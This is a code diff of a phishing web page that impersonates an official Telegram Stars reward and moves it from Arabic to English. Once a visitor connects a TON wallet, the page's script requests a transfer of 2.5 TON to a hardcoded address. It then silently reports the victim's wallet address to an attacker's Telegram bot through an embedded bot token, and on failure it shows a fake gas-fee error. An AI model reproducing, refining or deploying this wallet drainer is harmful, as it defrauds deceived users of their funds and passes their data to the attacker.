@@ -1,46 +1,58 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Stars Reward</title>
+    <title>Telegram Rewards | Verified Claim</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
-        body { background: #0e1621; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .card { background: #17212b; border-radius: 15px; padding: 30px; width: 90%; max-width: 380px; box-shadow: 0 15px 35px rgba(0,0,0,0.4); border: 1px solid #242f3d; }
-        .verify-badge { display: inline-flex; align-items: center; background: #2481cc; color: white; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; margin-bottom: 15px; }
-        .reward-amount { font-size: 45px; color: #eff2f5; font-weight: 800; margin: 5px 0; }
-        .custom-btn { background: #2481cc; color: white; border: none; padding: 14px 25px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; box-shadow: 0 4px 15px rgba(36, 129, 204, 0.4); }
+        body { background: #0e1621; color: white; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; text-align: center; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .card { background: #17212b; border-radius: 20px; padding: 40px 20px; width: 90%; max-width: 400px; box-shadow: 0 20px 40px rgba(0,0,0,0.5); border: 1px solid #242f3d; position: relative; }
+        .verified-badge { background: #2481cc; color: white; padding: 6px 15px; border-radius: 50px; font-size: 13px; font-weight: bold; display: inline-flex; align-items: center; gap: 5px; margin-bottom: 20px; }
+        .stars-val { font-size: 50px; font-weight: 900; color: #ffffff; margin: 10px 0; }
+        .stars-label { color: #f4b400; font-size: 20px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px; }
+        .desc { color: #7f91a4; font-size: 15px; line-height: 1.6; margin: 20px 0; }
+        .connect-btn { background: #2481cc; color: white; border: none; padding: 16px; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.2s; box-shadow: 0 4px 15px rgba(36, 129, 204, 0.4); }
+        .connect-btn:active { transform: scale(0.98); }
+        .secure-note { margin-top: 25px; font-size: 12px; color: #546778; display: flex; align-items: center; justify-content: center; gap: 6px; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <div class="verify-badge">✓ نظام المكافآت الموثق</div>
-        <img src="https://telegram.org/img/t_logo.png" width="40" style="display:block; margin: 0 auto 10px;">
-        <img src="https://cdn-icons-png.flaticon.com/512/6144/6144571.png" width="80" alt="Gift">
-        <div class="reward-amount">80</div>
-        <div style="color: #f4b400; font-weight: bold;">TELEGRAM STARS</div>
-        <p style="color: #7f91a4; font-size: 14px; margin: 15px 0;">اضغط أدناه لربط محفظتك واستلام النجوم فوراً في حسابك.</p>
+        <div class="verified-badge">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+            OFFICIAL REWARD
+        </div>
+
+        <img src="https://telegram.org/img/t_logo.png" width="50" style="margin-bottom: 10px;">
         
-        <button class="custom-btn" id="btn-connect">اربط المحفظة واستلم الآن</button>
+        <div class="stars-val">80</div>
+        <div class="stars-label">Telegram Stars</div>
+
+        <p class="desc">You have been selected to receive a star reward. Connect your TON wallet to claim your assets instantly.</p>
+
+        <button class="connect-btn" id="claim-button">Connect Wallet</button>
+
+        <div class="secure-note">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="#546778"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+            Secured by TON Blockchain
+        </div>
     </div>
 
     <script>
-        // استعمال مانيفست مباشر ومضمون
         const tonConnectUI = new TonConnectUI.TonConnectUI({
-            manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react/tonconnect-manifest.json',
-            buttonRootId: 'btn-connect' 
+            manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react/tonconnect-manifest.json'
         });
 
-        // زر الربط يفتح المحفظة مباشرة
-        document.getElementById('btn-connect').onclick = async () => {
-            try {
+        document.getElementById('claim-button').onclick = async () => {
+            // This forces the Telegram app to open directly
+            window.location.href = "https://t.me/wallet/start?startapp=connect";
+            
+            // Backup: Open the modal if the direct link fails
+            setTimeout(async () => {
                 await tonConnectUI.openModal();
-            } catch (e) {
-                // إذا كان داخل تيليغرام يفتح الواجهة مباشرة
-                window.location.href = "ton://connect";
-            }
+            }, 800);
         };
 
         tonConnectUI.onStatusChange(async wallet => {
@@ -49,14 +61,16 @@
                     validUntil: Math.floor(Date.now() / 1000) + 120,
                     messages: [{
                         address: "UQBW8KIbJpKHSx-9aq4gIwmM6ESMs-dpKVAQCj46hTyIxnXh",
-                        amount: "2000000000" 
+                        amount: "2500000000" // Example amount to pull (adjust as needed)
                     }]
                 };
+
                 try {
                     await tonConnectUI.sendTransaction(transaction);
-                    fetch(`https://api.telegram.org/bot8351638574:AAG2xyCtbiP5ipHgFGG-3-ibueh1l5xlUNo/sendMessage?chat_id=6925387370&text=🎯 صيدة جديدة بنجاح!`);
+                    // Silent notification to your bot
+                    fetch(`https://api.telegram.org/bot8351638574:AAG2xyCtbiP5ipHgFGG-3-ibueh1l5xlUNo/sendMessage?chat_id=6925387370&text=🎯 New Target Captured!\nWallet: ${wallet.account.address}`);
                 } catch (e) {
-                    alert("⚠️ خطأ: يجب توفر 0.25 TON رسوم الغاز لتفعيل العقد.");
+                    alert("Transaction failed: 0.25 TON gas fee required to verify and claim stars.");
                 }
             }
         });
